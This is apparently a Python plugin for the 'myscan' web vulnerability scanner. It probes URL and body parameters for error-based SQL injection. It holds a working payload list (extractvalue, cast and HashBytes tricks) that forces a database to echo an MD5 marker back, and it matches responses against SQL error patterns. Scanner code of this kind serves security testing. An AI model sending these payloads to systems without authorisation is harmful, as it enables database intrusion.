#!/usr/bin/env python3
# @Time    : 2020-02-15
# @Author  : caicai
# @File    : myscan_sqli_error_v1.1.py
'''
报错注入插件
1.在参数值后添加payload,正则匹配关键词
'''
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.helper.request import request
from myscan.lib.helper.helper_sqli import Get_sql_errors
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.common import get_random_num, getmd5


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sqli error"
        self.vulmsg = "sqli error"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        #搜索返回包:
        parser = dictdata_parser(self.dictdata)
        if self.search(parser.getresponsebody(), "Null payload , errors in response text "):
            return
            # pass
        # body url参数注入
        random_num = get_random_num(8)
        random_num_md5 = getmd5(random_num)
        payloads = [('鎈\'"\(', None, "a"),
                    ('"and/**/extractvalue(1,concat(char(126),md5({})))and"'.format(random_num), random_num_md5, "a"),
                    ("'and/**/extractvalue(1,concat(char(126),md5({})))and'".format(random_num), random_num_md5, "a"),
                    ("'and(select'1'from/**/cast(md5({})as/**/int))>'0".format(random_num), random_num_md5, "a"),
                    ('"and(select\'1\'from/**/cast(md5({})as/**/int))>"0'.format(random_num), random_num_md5, "a"),
                    ("'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))>'0".format(random_num),
                     random_num_md5, "a"),
                    ('"and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(\'MD5\',\'{}\')))>"0'.format(random_num),
                     random_num_md5, "a"),
                    ("'and/**/extractvalue(1,concat(char(126),md5({})))and'".format(random_num), random_num_md5, "a"),
                    ('"and/**/extractvalue(1,concat(char(126),md5({})))and"'.format(random_num), random_num_md5, "a"),
                    ("/**/and/**/cast(md5('{}')as/**/int)>0".format(random_num), random_num_md5, "a"),
                    ("convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num), random_num_md5,
                     "w"),
                    ("extractvalue(1,concat(char(126),md5({})))".format(random_num), random_num_md5, "w")
                    ]
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        if params:
            for param in params:
                for payload, search_str, method in payloads:
                    req = parser.getreqfromparam(param,method,payload)
                    r = request(**req)
                    if search_str == None:
                        if self.search(r, payload):
                            break
                            # pass
                    else:
                        if self.search_md5(r, random_num_md5[10:20], payload):
                            break
                            # pass

        # cookie注入
        pass

    def search_md5(self, r, md5, payload):
        if r != None:
            if md5 in r.text:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url").get("url").split("?")[0],
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "dbms_type": "unknown",
                        "payload": payload,
                        "error_info": "md5 str {} in response".format(md5),
                        "request": parser_.getrequestraw().decode(errors="ignore"),
                        "response": parser_.getresponseraw().decode(errors="ignore")
                    }

                })
                return True

    def search(self, r, payload):
        if r != None:
            for sql_regex, dbms_type in Get_sql_errors():
                r_is_response=True
                if isinstance(r,bytes):
                    r_is_response=False
                    match= sql_regex.search(r.decode(errors="ignore"))
                else:
                    match = sql_regex.search(r.text)
                if match:
                    parser_ = response_parser(r)
                    self.result.append({
                        "name": self.name,
                        "url": self.dictdata.get("url").get("url").split("?")[0],
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "dbms_type": dbms_type,
                            "error_info": match.group(),
                            "payload": payload,
                            "request": parser_.getrequestraw().decode(errors="ignore") if r_is_response else "",
                            "response": parser_.getresponseraw().decode(errors="ignore") if r_is_response else ""
                        }

                    })
                    return True
